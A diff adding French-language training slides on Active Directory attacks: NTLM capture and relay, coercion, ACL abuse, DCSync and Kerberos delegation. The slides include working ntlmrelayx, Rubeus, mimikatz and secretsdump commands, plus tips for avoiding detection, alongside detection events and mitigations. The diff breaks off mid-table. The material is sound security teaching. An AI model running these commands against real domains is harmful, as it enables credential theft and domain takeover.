+    <li>Les hashes Net-NTLMv2 capturés peuvent être crackés offline avec hashcat (mode 5600). Un GPU récent teste plusieurs centaines de millions de candidats par seconde : avec rockyou.txt, un mot de passe basé sur un mot courant tombe en quelques secondes ; un mot de passe plus élaboré peut résister des heures à des jours.</li>
+    <li>Attention : Responder répond aussi aux requêtes SMB et HTTP par défaut. Quand on prépare un NTLM Relay, il faut <strong>désactiver SMB et HTTP dans Responder</strong> (Responder.conf) pour que l'outil ntlmrelayx puisse capter les connexions et les relayer sans conflits de port.</li>
+  </ul>
+  <pre><code class="language-bash"># Lancer Responder en mode capture
+python3 Responder.py -I eth0 -rdwv
+
+# Cracker les hashes capturés
+hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt</code></pre>
+  <div class="infobox" style="margin-top:0.3em;">
+    Les hashes capturés sont sauvegardés dans <code>/usr/share/responder/logs/</code>
+  </div>
+</section>
+
+<section>
+  <h2>NTLM Relay — Principe du man-in-the-middle</h2>
+  <p class="sub" style="margin-bottom:0.4em;">Plutôt que de cracker le hash, on le <strong>réutilise en temps réel</strong> en se positionnant entre la victime et une cible tierce. La clé : transmettre à la victime le <strong>même nonce</strong> reçu de la cible — sa réponse NTLMv2 est alors valide pour la cible.</p>
+  <div class="mbox">
+    <p class="mc">1. Victime ───→ <span class="my">Attaquant</span> : NEGOTIATE</p>
+    <p class="mc">2. <span class="my">Attaquant</span> ──→ Cible     : NEGOTIATE</p>
+    <p class="mc">3. Cible ──────→ <span class="my">Attaquant</span> : CHALLENGE (nonce C)</p>
+    <p class="mc">4. <span class="my">Attaquant</span> ──→ Victime   : CHALLENGE (même nonce C)</p>
+    <p class="mc">5. Victime ───→ <span class="my">Attaquant</span> : AUTHENTICATE (NTLMv2 sur nonce C)</p>
+    <p class="mc">6. <span class="my">Attaquant</span> ──→ Cible     : AUTHENTICATE (même réponse)</p>
+    <p class="ms">→ Attaquant est authentifié en tant que Victime sur la Cible</p>
+  </div>
+  <div class="hlbox" style="font-size:0.85em;">
+    Condition nécessaire : la <strong>signature SMB/LDAP doit être désactivée</strong> sur la cible — sinon le relay échoue car les paquets sont signés avec une clé que l'attaquant ne possède pas
+  </div>
+</section>
+
+<section>
+  <h2>SMB Signing — La protection principale contre le relay</h2>
+  <ul>
+    <li>Le <strong>SMB Signing</strong> (signature des paquets SMB) empêche le relay SMB en signant cryptographiquement chaque paquet avec une clé dérivée de la session. Sans accès à cette clé, l'attaquant ne peut pas créer des paquets SMB valides à relayer.</li>
+    <li>Par défaut : SMB Signing est <strong>requis sur les DCs</strong> mais seulement <strong>supporté (non requis) sur les workstations et serveurs</strong>. C'est pourquoi le SMB relay vise généralement les workstations et non les DCs.</li>
+    <li>Le LDAP Signing est souvent plus permissif : il faut le <strong>LDAP Channel Binding</strong> (EPA) pour bloquer le LDAP Relay — et ce paramètre n'est pas activé par défaut sur toutes les versions de Windows Server.</li>
+  </ul>
+  <div class="two-col" style="font-size:0.9em;margin-top:0.5em;">
+    <div>
+      <p style="color:var(--green);font-weight:bold;">Bloque le relay ✓</p>
+      <ul>
+        <li>SMB Signing required</li>
+        <li>LDAP Signing required</li>
+        <li>LDAP Channel Binding (EPA)</li>
+      </ul>
+    </div>
+    <div>
+      <p style="color:var(--red);font-weight:bold;">Vulnérable ✗</p>
+      <ul>
+        <li>SMB Signing disabled/optional (workstations)</li>
+        <li>LDAP sans Channel Binding</li>
+        <li>HTTP sans EPA</li>
+      </ul>
+    </div>
+  </div>
+</section>
+
+<section>
+  <h2>SMB Relay — Exploitation</h2>
+  <ul>
+    <li>Le SMB Relay cible des machines sans SMB Signing obligatoire. Si la victime est administrateur local sur la cible, on obtient une exécution de commande ou un shell avec les droits SYSTEM.</li>
+  </ul>
+  <pre><code class="language-bash"># Etape 1 — Désactiver SMB et HTTP dans /etc/responder/Responder.conf
+# SMB = Off  |  HTTP = Off
+
+# Etape 2 — Préparer la liste des cibles sans SMB signing
+nmap --script smb2-security-mode -p445 192.168.1.0/24 | grep -B5 "not required"
+
+# Etape 3 — Lancer ntlmrelayx (cible unique ou liste)
+ntlmrelayx.py -t smb://192.168.1.50 -smb2support -c "whoami > C:\users\public\out.txt"
+ntlmrelayx.py -tf targets.txt -smb2support --dump-lm   # dump SAM de toutes les cibles
+
+# Etape 4 — Responder empoisonne le réseau
+python3 Responder.py -I eth0 -rdw</code></pre>
+  <div class="infobox" style="margin-top:0.3em;">
+    Option <code>-i</code> de ntlmrelayx : obtenir un shell SMB interactif au lieu d'exécuter une commande
+  </div>
+</section>
+
+<section>
+  <h2>LDAP Relay — Possibilités offensives</h2>
+  <ul>
+    <li>Relayer une authentification NTLM vers LDAP sur le DC permet d'effectuer des opérations LDAP <em>en tant que la victime</em>. Si la victime a des droits suffisants dans AD, les possibilités sont très larges.</li>
+    <li><strong>Créer un compte machine</strong> : par défaut, tout utilisateur du domaine peut créer jusqu'à 10 comptes machine (<code>MachineAccountQuota</code> = 10). Ce compte contrôlé sera utilisé ensuite pour configurer RBCD (cf. Partie 6).</li>
+    <li><strong>Modifier des ACE</strong> : si la victime a <code>WriteDACL</code> sur le domaine ou un objet sensible, on peut s'attribuer des droits DCSync ou GenericAll.</li>
+    <li><strong>Configurer RBCD</strong> : si la victime a <code>GenericWrite</code> sur un Computer, on peut modifier <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> pour préparer une attaque RBCD (cf. Partie 6).</li>
+  </ul>
+  <pre><code class="language-bash"># Relay vers LDAP + création compte machine + RBCD
+ntlmrelayx.py -t ldaps://dc01.corp.local \
+  --add-computer FAKE$ \
+  --delegate-access \
+  --no-smb-server --no-http-server</code></pre>
+</section>
+
+<section>
+  <h2>Coercition d'authentification — Forcer une cible à s'authentifier</h2>
+  <ul>
+    <li>Les attaques de relay et PtT sont encore plus puissantes quand on peut <strong>forcer une machine cible à s'authentifier vers nous</strong> — c'est la coercition d'authentification.</li>
+    <li><strong>PrinterBug / SpoolSample</strong> : exploite le protocole MS-RPRN (Print Spooler). On demande à une machine distante de notifier un changement d'imprimante vers notre machine → la machine cible s'authentifie vers nous en NTLM.</li>
+    <li><strong>PetitPotam</strong> : exploite MS-EFSRPC (Encrypting File System Remote Protocol). Force une machine à s'authentifier vers nous. Particulièrement utile pour forcer un DC à s'authentifier.</li>
+    <li><strong>DFSCoerce, ShadowCoerce</strong> : variantes utilisant d'autres protocoles RPC (DFS, VSS) pour la même finalité. Ces techniques évoluent constamment à mesure que des protocoles sont patchés.</li>
+  </ul>
+  <div class="hlbox">
+    La combinaison <em>coercition d'authentification + NTLM Relay</em> est une chaîne fréquemment exploitée en red team pour progresser dans un AD sans credentials initiaux
+  </div>
+</section>
+
+<section>
+  <h2>Coercition + Relay — Exemples de chaînes d'attaque</h2>
+  <div class="mbox" style="font-size:0.66em;">
+    <p class="my">Chaîne 1 : LLMNR Poisoning + SMB Relay → exécution de code</p>
+    <p class="mc" style="margin-left:1em;">Responder capte une requête LLMNR → alice s'authentifie vers l'attaquant</p>
+    <p class="mc" style="margin-left:1em;">ntlmrelayx.py -t smb://WS02 <span class="mg">(SMB signing absent)</span></p>
+    <p class="ms" style="margin-left:1em;">→ Shell SYSTEM sur WS02 si alice est admin local — dump hashes SAM</p>
+    <p class="my" style="margin-top:0.5em;">Chaîne 2 : LDAP Relay + RBCD → accès machine</p>
+    <p class="mc" style="margin-left:1em;">alice a GenericWrite sur SRV01 <span class="mg">(misconfiguration ACE)</span></p>
+    <p class="mc" style="margin-left:1em;">Responder capte l'auth d'alice → relay vers LDAP</p>
+    <p class="mc" style="margin-left:1em;">ntlmrelayx.py -t ldap://dc01 --delegate-access <span class="mg">(configure RBCD sur SRV01)</span></p>
+    <p class="ms" style="margin-left:1em;">→ S4U2Proxy → accès admin sur SRV01 → mouvement latéral</p>
+    <p class="my" style="margin-top:0.5em;">Chaîne 3 : Unconstrained Delegation + PrinterBug → TGT DC$ → DCSync</p>
+    <p class="mc" style="margin-left:1em;">[cf. Partie 6 — Unconstrained Delegation]</p>
+  </div>
+</section>
+
+
+<!-- =====================================================================
+     PARTIE 5 — ACLs / DACLs
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#001010 0%,#003535 100%)" class="ctr">
+  <p class="part-number">Partie 5</p>
+  <h1 style="color:#fff;font-size:1.8em;">Abus des ACLs &amp; DACLs</h1>
+  <p style="color:var(--blue);font-size:0.9em;">Permissions mal configurées → escalade de privilèges</p>
+</section>
+
+<section>
+  <h2>Le modèle de permissions AD — Rappel complet</h2>
+  <ul>
+    <li>Dans AD, chaque objet possède un <strong>Security Descriptor</strong> qui contient quatre éléments : Owner (propriétaire), DACL (Discretionary ACL), SACL (System ACL, pour l'audit), et Group. La DACL liste les ACE qui définissent qui peut faire quoi sur l'objet.</li>
+    <li>Les ACE peuvent être héritées depuis les OUs parentes ou définies directement. Une ACE héritée d'une OU s'applique à tous les objets descendants — une erreur de permission à ce niveau peut compromettre des centaines d'objets en une seule ACE.</li>
+    <li>Les objets membres de groupes privilégiés (Domain Admins, etc.) ont leur DACL <em>remplacée</em> toutes les 60 minutes par la DACL du container <strong>AdminSDHolder</strong> via le processus SDProp. Cela signifie que ces comptes sont "protégés" mais aussi que modifier AdminSDHolder permet une persistance durable.</li>
+    <li>L'audit des ACE en entreprise est une tâche complexe car elles s'accumulent sur des années. BloodHound est le seul outil pratique pour analyser l'ensemble des permissions d'un AD à grande échelle.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Types d'ACE offensifs — Rappel</h2>
+  <table style="font-size:0.56em;">
+    <thead><tr><th style="width:30%;">Nom Microsoft (ADUC)</th><th style="width:18%;">BloodHound</th><th style="width:52%;">Impact offensif et cas d'usage</th></tr></thead>
+    <tbody>
+      <tr><td><strong>Full Control</strong> / Generic All</td><td><code>GenericAll</code></td><td>Contrôle total : réinitialiser mot de passe, modifier attributs, ajouter au groupe, modifier DACL</td></tr>
+      <tr><td><strong>Generic Write</strong></td><td><code>GenericWrite</code></td><td>Modifier les attributs non protégés : SPN, délégation, scriptPath, msDS-KeyCredentialLink</td></tr>
+      <tr><td><strong>Modify owner</strong> (WRITE_OWNER)</td><td><code>WriteOwner</code></td><td>Prendre la propriété → WRITE_DAC implicite → GenericAll</td></tr>
+      <tr><td><strong>Modify permissions</strong> (WRITE_DAC)</td><td><code>WriteDACL</code></td><td>Réécrire la DACL → s'attribuer n'importe quel droit, y compris DCSync</td></tr>
+      <tr><td><strong>Reset password</strong> (User-Force-Change-Password)</td><td><code>ForceChangePassword</code></td><td>Changer le mot de passe sans connaître l'actuel</td></tr>
+      <tr><td><strong>Add/remove self as member</strong></td><td><code>AddMember</code></td><td>S'ajouter ou ajouter un compte contrôlé à un groupe</td></tr>
+      <tr><td><strong>All Extended Rights</strong></td><td><code>AllExtendedRights</code></td><td>Reset password + lecture LAPS + DS-Replication selon l'objet</td></tr>
+      <tr><td><strong>DS-Replication-Get-Changes-All</strong> (Extended Right)</td><td><code>DCSync</code></td><td>Droits de réplication AD → extraire tous les hashes du domaine</td></tr>
+      <tr><td><strong>WriteProperty sur <code>servicePrincipalName</code> uniquement</strong></td><td><code>WriteSPN</code></td><td>Ajouter un SPN sur un compte → Targeted Kerberoasting. Sous-ensemble de GenericWrite : Shadow Credentials impossible (msDS-KeyCredentialLink non accessible)</td></tr>
+      <tr><td><strong>Read LAPS password</strong> (ms-Mcs-AdmPwd)</td><td><code>ReadLAPSPassword</code></td><td>Lire le mot de passe admin local géré par LAPS</td></tr>
+    </tbody>
+  </table>
+</section>
+
+<section>
+  <h2>Découverte des ACE intéressantes</h2>
+  <ul>
+    <li><strong>BloodHound</strong> est l'outil de référence : SharpHound collecte toutes les ACE et les représente comme arêtes dans le graphe. On peut ensuite construire des requêtes Cypher pour filtrer précisément les situations exploitables.</li>
+    <li><strong>PowerView</strong> permet une interrogation plus fine directement depuis PowerShell :</li>
+  </ul>
+  <pre><code class="language-powershell"># Toutes les ACE d'un objet avec résolution des GUIDs
+Get-DomainObjectACL -Identity "alice" -ResolveGUIDs
+
+# ACE d'un principal spécifique sur tous les objets du domaine
+Get-DomainObjectACL -ResolveGUIDs | Where-Object {
+    $_.SecurityIdentifier -eq (Get-DomainUser alice).objectsid
+}
+
+# Chercher qui a des droits sur les DCs
+Get-DomainObjectACL -Identity "DC01" -ResolveGUIDs |
+    Where-Object { $_.ActiveDirectoryRights -match "Write|GenericAll" }</code></pre>
+  <div class="infobox" style="margin-top:0.3em;">
+    En TP, vous construirez les requêtes Cypher BloodHound pour identifier ces mêmes chemins à partir des données collectées
+  </div>
+</section>
+
+<section>
+  <h2>GenericAll sur un User — Exploitation</h2>
+  <ul>
+    <li><code>GenericAll</code> sur un compte utilisateur donne un contrôle total sur cet objet. Les vecteurs d'exploitation les plus discrets sont ceux qui ne modifient pas le mot de passe directement (car un changement de mot de passe est loggé et l'utilisateur peut remarquer qu'il ne peut plus se connecter).</li>
+    <li><strong>Targeted Kerberoasting</strong> : ajouter un SPN au compte cible (<code>servicePrincipalName</code>) puis demander un ST — le hash obtenu est celui du compte cible. On retire le SPN ensuite pour ne pas laisser de trace.</li>
+    <li><strong>Shadow Credentials</strong> : modifier l'attribut <code>msDS-KeyCredentialLink</code> du compte pour y ajouter une clé publique contrôlée. On peut ensuite s'authentifier avec la clé privée via PKINIT — technique récente qui ne change pas le mot de passe et génère peu de logs.</li>
+    <li><strong>ForceChangePassword</strong> : changer brutalement le mot de passe — efficace mais visible (l'utilisateur ou les monitors le remarquent).</li>
+  </ul>
+  <pre><code class="language-powershell"># PowerView — Targeted Kerberoasting via GenericAll
+Set-DomainObject -Identity alice -Set @{serviceprincipalname="fake/spn.corp.local"}
+# Kerberoaster alice, puis nettoyer
+Set-DomainObject -Identity alice -Clear serviceprincipalname</code></pre>
+</section>
+
+<section>
+  <h2>GenericAll / AddMember sur un Groupe</h2>
+  <ul>
+    <li>Avoir <code>GenericAll</code> ou <code>AddMember</code> sur un groupe privilégié est l'un des chemins d'escalade les plus directs. On s'ajoute au groupe et on hérite immédiatement de tous ses droits.</li>
+    <li>Attention : l'ajout à un groupe privilégié génère un Event ID <strong>4728</strong> (membre ajouté à un groupe de sécurité global) dans les logs du DC — c'est un événement surveillé dans tout SOC sérieux. Préférer des techniques plus silencieuses quand possible.</li>
+    <li>Alternative plus discrète : si on a <code>GenericWrite</code> sur une <em>machine</em>, configurer RBCD (cf. Partie 6) pour obtenir un accès admin local sans toucher aux groupes de domaine.</li>
+  </ul>
+  <pre><code class="language-powershell"># PowerView — s'ajouter à Domain Admins
+Add-DomainGroupMember -Identity "Domain Admins" -Members "attacker"
+
+# Net — équivalent natif Windows
+net group "Domain Admins" attacker /add /domain
+
+# Vérifier (pour confirmer)
+Get-DomainGroupMember -Identity "Domain Admins"</code></pre>
+</section>
+
+<section>
+  <h2>WRITE_DAC / WRITE_OWNER — La chaîne de contrôle</h2>
+  <ul>
+    <li><strong>WRITE_OWNER</strong> (<em>"Modifier le propriétaire"</em> dans ADUC, <code>WriteOwner</code> dans BloodHound) — prendre la propriété d'un objet donne implicitement <code>WRITE_DAC</code> dessus, même sans ACE explicite.</li>
+    <li><strong>WRITE_DAC</strong> (<em>"Modifier les autorisations"</em> dans ADUC, <code>WriteDACL</code> dans BloodHound) — réécrire la DACL de l'objet : on peut s'y attribuer GenericAll ou n'importe quel droit.</li>
+    <li>Chaîne classique : <code>WRITE_OWNER</code> → propriété → <code>WRITE_DAC</code> implicite → <code>GenericAll</code> → contrôle total.</li>
+    <li>Cas critique : <code>WRITE_DAC</code> sur l'<strong>objet Domaine</strong> → s'attribuer <code>DS-Replication-Get-Changes-All</code> → <strong>DCSync</strong> sur tout le domaine.</li>
+  </ul>
+  <pre><code class="language-powershell"># S'attribuer DCSync rights via WRITE_DAC sur le domaine (PowerView)
+Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" `
+  -PrincipalIdentity attacker -Rights DCSync
+
+# DCSync
+lsadump::dcsync /user:krbtgt /domain:corp.local</code></pre>
+</section>
+
+<section>
+  <h2>AdminSDHolder — Mécanisme et exploitation</h2>
+  <ul>
+    <li>L'<strong>AdminSDHolder</strong> est un container spécial (<code>CN=AdminSDHolder,CN=System,DC=corp,DC=local</code>) dont la DACL sert de modèle de sécurité pour tous les comptes privilégiés. Le processus <strong>SDProp</strong> s'exécute toutes les 60 minutes et copie cette DACL vers tous les membres actuels et anciens des groupes protégés.</li>
+    <li>Objectif légitime : assurer que les comptes privilégiés ne peuvent pas être modifiés par des administrateurs délégués qui auraient des droits sur les OUs parentes. C'est une protection, pas une faille.</li>
+    <li>Vecteur d'attaque : si on obtient <code>WriteDACL</code> sur AdminSDHolder, on peut y ajouter une ACE donnant <code>GenericAll</code> à notre compte. À la prochaine exécution de SDProp (≤ 60 min), notre ACE se propage sur <em>tous</em> les comptes protégés du domaine.</li>
+    <li>Vecteur de <strong>persistance durable</strong> : même si un admin supprime notre ACE directement sur un compte cible, SDProp la remet automatiquement toutes les 60 minutes. La seule façon de stopper ça est de supprimer l'ACE d'AdminSDHolder lui-même.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>DCSync — Répliquer le domaine sans toucher au DC</h2>
+  <ul>
+    <li>Au lieu d'accéder physiquement à NTDS.dit, on imite un DC secondaire demandant une réplication partielle via <strong>MS-DRSR</strong>. Le DC répond sans vérifier la légitimité de la demande — il suffit d'avoir les droits adéquats.</li>
+    <li>Droits requis sur l'objet Domaine : <code>DS-Replication-Get-Changes</code> + <code>DS-Replication-Get-Changes-All</code>. Normalement réservés à Domain Admins, Enterprise Admins et DCs — mais toute ACE mal configurée peut les déléguer (cf. WRITE_DAC sur l'objet Domaine).</li>
+    <li>Détection : <strong>Event ID 4662</strong> sur le DC avec le GUID <code>{1131f6aa-9c07-11d1-f79f-00c04fc2dcd2}</code> depuis une IP qui n'est pas un DC — c'est l'alerte DCSync standard dans un SIEM.</li>
+  </ul>
+  <pre><code class="language-bash"># Mimikatz
+lsadump::dcsync /user:krbtgt /domain:corp.local
+
+# Impacket (depuis Linux)
+secretsdump.py corp.local/attacker:password@dc01.corp.local -just-dc-ntlm</code></pre>
+</section>
+
+
+<!-- =====================================================================
+     PARTIE 6 — DELEGATION KERBEROS
+     ===================================================================== -->
+<section data-background-gradient="linear-gradient(135deg,#0a001a 0%,#200045 100%)" class="ctr">
+  <p class="part-number">Partie 6</p>
+  <h1 style="color:#fff;font-size:1.8em;">Délégation Kerberos</h1>
+  <p style="color:var(--blue);font-size:0.9em;">Unconstrained · Constrained · RBCD</p>
+</section>
+
+<section>
+  <h2>Pourquoi la délégation Kerberos existe</h2>
+  <ul>
+    <li>Problème fondamental de l'architecture à plusieurs niveaux : un utilisateur s'authentifie sur un serveur web (niveau 1), et ce serveur web doit accéder à une base de données SQL (niveau 2) en utilisant <em>l'identité de l'utilisateur</em> — et non sa propre identité. C'est le problème du <strong>double hop Kerberos</strong>.</li>
+    <li>Sans délégation, le serveur web ne peut s'authentifier auprès du serveur SQL que sous sa propre identité (le compte service IIS), pas celle de l'utilisateur. La délégation Kerberos résout ce problème en permettant au serveur web d'obtenir un ticket Kerberos valide pour l'utilisateur et de l'utiliser pour se connecter au SQL.</li>
+    <li>La délégation existe en trois variantes de sécurité croissante : Unconstrained (la plus ancienne et la plus dangereuse), Constrained (plus contrôlée), et Resource-Based Constrained (RBCD, la plus moderne et la plus sécurisée mais aussi la plus exploitable via les ACE).</li>
+  </ul>
+  <div class="infobox">
+    La délégation est une <em>feature légitime et nécessaire</em> dans de nombreuses architectures — ce n'est pas une vulnérabilité en soi, mais ses mauvaises configurations le sont
+  </div>
+</section>
+
+<section>
+  <h2>S4U2Self et S4U2Proxy — Extensions Kerberos</h2>
+  <ul>
+    <li><strong>S4U2Self</strong> (Service for User to Self) : permet à un service d'obtenir un Service Ticket pour un utilisateur <em>arbitraire</em>, adressé à lui-même, sans que cet utilisateur n'ait initié de demande. Le service prouve qu'il agit de façon légitime pour cet utilisateur. Cela crée un "proxy ticket" qui peut ensuite être utilisé avec S4U2Proxy.</li>
+    <li><strong>S4U2Proxy</strong> (Service for User to Proxy) : permet à un service d'utiliser un ST obtenu via S4U2Self (ou fourni par l'utilisateur) pour demander un nouveau ST vers un autre service, toujours au nom de l'utilisateur original. C'est ce mécanisme qui fait le "double hop".</li>
+    <li>Offensivement, S4U2Self est précieux car il permet d'<strong>obtenir un ST pour Administrator</strong> (ou n'importe quel utilisateur) sans que celui-ci se soit jamais authentifié — à condition d'avoir compromis un compte avec les bons flags de délégation ou d'avoir configuré RBCD.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>Unconstrained Delegation — Mécanisme</h2>
+  <ul>
+    <li>Flag : <code>TRUSTED_FOR_DELEGATION</code> sur le compte machine ou de service. Quand un utilisateur s'authentifie auprès d'un service avec ce flag activé, Kerberos inclut automatiquement le <strong>TGT de l'utilisateur dans l'AP-REQ</strong> (étape 5), et ce TGT est stocké en mémoire par le service.</li>
+    <li>L'idée originale était que le service en délégation non contrainte puisse se connecter à n'importe quel autre service en utilisant ce TGT stocké — d'où "non contrainte". En pratique, c'est un risque de sécurité majeur car la machine stocke les TGTs de tous les utilisateurs qui s'y connectent.</li>
+    <li>Les <strong>contrôleurs de domaine</strong> ont ce flag activé par défaut (normal — ils sont KDC). C'est sur les <em>serveurs non-DC</em> que cette configuration est dangereuse et souvent inutile. Les serveurs IIS, les serveurs de fichiers qui ont ce flag activé "parce que quelqu'un en avait besoin un jour" sont des cibles prioritaires.</li>
+  </ul>
+  <div class="infobox" style="font-size:0.85em;">
+    Dans BloodHound CE, ces machines sont identifiables par leur propriété <code>unconstraineddelegation = true</code> — c'est l'un des premiers filtres à appliquer lors d'une investigation
+  </div>
+</section>
+
+<section>
+  <h2>Unconstrained Delegation — Attaque avec PrinterBug</h2>
+  <ul>
+    <li>L'attaque combine deux éléments : une machine avec Unconstrained Delegation que l'on contrôle (SRV01), et la coercition d'authentification d'un DC via le Printer Bug (SpoolSample). Le DC forcé à s'authentifier vers SRV01 verra son TGT stocké dans la mémoire de SRV01.</li>
+  </ul>
+  <div class="mbox">
+    <p class="mg">// SRV01 : Unconstrained Delegation activée — compromis par l'attaquant</p>
+    <p class="mc"><span class="my">1.</span> Attaquant sur SRV01 : <span class="my">Rubeus.exe monitor /interval:5 /nowrap</span></p>
+    <p class="mc"><span class="my">2.</span> <span class="mr">SpoolSample.exe DC01.corp.local SRV01.corp.local</span></p>
+    <p class="mg" style="margin-left:2em;">→ Force DC01$ à s'authentifier vers SRV01 via MS-RPRN</p>
+    <p class="mc"><span class="my">3.</span> Rubeus capte le TGT de DC01$ → base64</p>
+    <p class="mc"><span class="my">4.</span> <span class="my">Rubeus.exe ptt /ticket:&lt;base64-TGT-DC01$&gt;</span></p>
+    <p class="mc"><span class="my">5.</span> <span class="my">secretsdump.py -k -no-pass DC01.corp.local</span></p>
+    <p class="ms"><span class="my">→</span> Tous les hashes du domaine via DCSync avec le TGT de DC01$</p>
+  </div>
+  <div class="infobox" style="font-size:0.85em;">
+    DC01$ (le compte machine du DC) dispose des droits de réplication → son TGT suffit pour un DCSync complet
+  </div>
+</section>
+
+<section>
+  <h2>Constrained Delegation — Mécanisme</h2>
+  <ul>
+    <li>La délégation contrainte a été introduite pour limiter les risques de l'Unconstrained Delegation. L'attribut <code>msDS-AllowedToDelegateTo</code> liste explicitement les SPNs vers lesquels le compte peut déléguer — il ne peut pas "sauter" vers d'autres services.</li>
+    <li>Le compte utilise <strong>S4U2Self</strong> pour obtenir un ST pour l'utilisateur cible, puis <strong>S4U2Proxy</strong> pour utiliser ce ST afin d'accéder au service listé dans <code>msDS-AllowedToDelegateTo</code>. Le KDC vérifie que la délégation est autorisée avant de délivrer le ticket final.</li>
+    <li>Avantage sur Unconstrained : le TGT de l'utilisateur n'est pas stocké — seul un ST limité au service autorisé est généré. Si le service est compromis, l'attaquant ne peut déléguer que vers les services listés.</li>
+  </ul>
+  <div class="mbox" style="font-size:0.64em;">
+    <p class="mg">// svc-web : msDS-AllowedToDelegateTo = MSSQLSvc/srv-sql01.corp.local</p>
+    <p class="mc">svc-web → KDC : S4U2Self pour "Administrator" <span class="mg">(→ ST adressé à svc-web)</span></p>
+    <p class="mc">svc-web → KDC : S4U2Proxy avec ST → MSSQLSvc/srv-sql01</p>
+    <p class="ms">→ ST pour MSSQLSvc en tant qu'Administrator</p>
+  </div>
+</section>
+
+<section>
+  <h2>Constrained Delegation — Protocol Transition et attaque</h2>
+  <ul>
+    <li>Le flag <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> active le <strong>Protocol Transition</strong> (aka S4U2Self étendu) : le service peut utiliser S4U2Self pour n'importe quel utilisateur <em>sans avoir leur TGT</em>. Sans ce flag, S4U2Self nécessite que l'utilisateur soit préalablement authentifié auprès du service.</li>
+    <li>Avec Protocol Transition activé, compromettre le compte de service suffit pour usurper l'identité de n'importe quel utilisateur du domaine vers les services listés — y compris impersonner Administrator pour accéder à SQL, CIFS, LDAP...</li>
+  </ul>
+  <pre><code class="language-bash"># Rubeus — S4U complet depuis le hash du compte de service
+Rubeus.exe s4u /user:svc-web /rc4:&lt;hash_svc-web&gt; \
+  /impersonateuser:administrator \
+  /msdsspn:"MSSQLSvc/srv-sql01.corp.local:1433" \
+  /altservice:cifs /ptt
+
+# Impacket
+getST.py -spn "MSSQLSvc/srv-sql01.corp.local:1433" \
+  -impersonate Administrator \
+  corp.local/svc-web -hashes :&lt;hash&gt;</code></pre>
+  <div class="infobox" style="margin-top:0.3em;">
+    L'option <code>/altservice</code> permet de modifier le SPN dans le ticket forgé — utile pour accéder au même serveur via un autre protocole (CIFS au lieu de MSSQLSvc)
+  </div>
+</section>
+
+<section>
+  <h2>RBCD — Resource-Based Constrained Delegation</h2>
+  <ul>
+    <li>RBCD renverse le modèle de contrôle de la délégation : au lieu que le <em>compte qui délègue</em> liste les services cibles, c'est la <em>ressource cible</em> qui liste les comptes autorisés à déléguer vers elle. Cela est configuré via l'attribut <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> sur l'objet Computer cible.</li>
+    <li>L'avantage sécuritaire : les admins de la ressource contrôlent qui peut se faire passer pour des utilisateurs pour y accéder — plus besoin de droits d'admin de domaine pour configurer ça.</li>
+    <li>Le vecteur d'attaque : si un attaquant a <code>GenericWrite</code> (ou <code>GenericAll</code>) sur un objet Computer dans AD, il peut modifier <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> pour y inscrire un compte machine qu'il contrôle. Ce compte contrôlé peut alors usurper Administrator pour accéder à la machine cible.</li>
+    <li>La création d'un compte machine est triviale : tout utilisateur de domaine peut en créer jusqu'à 10 par défaut (<code>MachineAccountQuota</code> = 10) — aucun droit admin requis.</li>
+  </ul>
+</section>
+
+<section>
+  <h2>RBCD — Attaque complète étape par étape</h2>
+  <div class="mbox">
+    <p class="mg">// Prérequis : GenericWrite sur WS01.corp.local</p>
+    <p class="mc"><span class="my">1.</span> Créer un compte machine contrôlé <span class="mg">(MachineAccountQuota = 10)</span></p>
+    <p class="mg" style="margin-left:2em;">addcomputer.py corp.local/alice:Passw0rd -computer-name "FAKE$" -computer-pass "Azerty1!"</p>
+    <p class="mc"><span class="my">2.</span> Récupérer le SID de FAKE$ et configurer RBCD sur WS01</p>
+    <p class="mg" style="margin-left:2em;">rbcd.py corp.local/alice:Passw0rd -delegate-from "FAKE$" -delegate-to "WS01$" -action write</p>
+    <p class="mc"><span class="my">3.</span> S4U2Self + S4U2Proxy : obtenir un ST admin pour WS01</p>
+    <p class="mg" style="margin-left:2em;">getST.py corp.local/"FAKE$":Azerty1! -spn "cifs/ws01.corp.local" -impersonate Administrator</p>
+    <p class="mc"><span class="my">4.</span> Utiliser le ST (KRB5CCNAME=Administrator.ccache)</p>
+    <p class="ms" style="margin-left:2em;">secretsdump.py -k -no-pass ws01.corp.local → hashes locaux → mouvement latéral</p>
+  </div>
+</section>
+
+<section>
+  <h2>RBCD — Via NTLM Relay (combinaison P4 + P6)</h2>
+  <ul>
+    <li>La combinaison NTLM Relay (Partie 4) + RBCD (Partie 6) est particulièrement puissante car elle ne nécessite aucun accès préalable à la machine cible — juste capturer l'authentification NTLM d'un compte ayant <code>GenericWrite</code> sur une machine.</li>
+    <li>ntlmrelayx en mode <code>--delegate-access</code> automatise entièrement les étapes 1 et 2 de l'attaque RBCD : il crée le compte machine et configure RBCD en une seule opération, le tout via le relay LDAP.</li>
+  </ul>
+  <pre><code class="language-bash"># Lancer ntlmrelayx en mode RBCD automatique
+ntlmrelayx.py -t ldaps://dc01.corp.local \
+  --delegate-access \
+  --add-computer FAKE$ \
+  --escalate-user attacker_user
+
+# Une fois RBCD configuré, obtenir le ST et accéder à la cible
+getST.py corp.local/"FAKE$":password -spn "cifs/ws01.corp.local" -impersonate Administrator
+export KRB5CCNAME=Administrator@cifs_ws01.corp.local.ccache
+secretsdump.py -k -no-pass ws01.corp.local</code></pre>
+</section>
+
+<section>
+  <h2>Récapitulatif — Les trois types de délégation</h2>
+  <table>
+    <thead>
+      <tr><th style="width:22%;"></th><th>Unconstrained</th><th>Constrained</th><th>RBCD</th></tr>
+    </thead>
+    <tbody>
+      <tr><td><strong>Attribut clé</strong></td><td><code>TRUSTED_FOR_DELEGATION</code></td><td><code>msDS-AllowedToDelegateTo</code></td><td><code>msDS-AllowedToActOnBehalfOfOtherIdentity</code></td></tr>
+      <tr><td><strong>Stocke le TGT ?</strong></td><td>Oui — en mémoire</td><td>Non</td><td>Non</td></tr>
+      <tr><td><strong>Portée</strong></td><td>N'importe quel service</td><td>Liste blanche sur le déléguant</td><td>Liste blanche sur la ressource</td></tr>
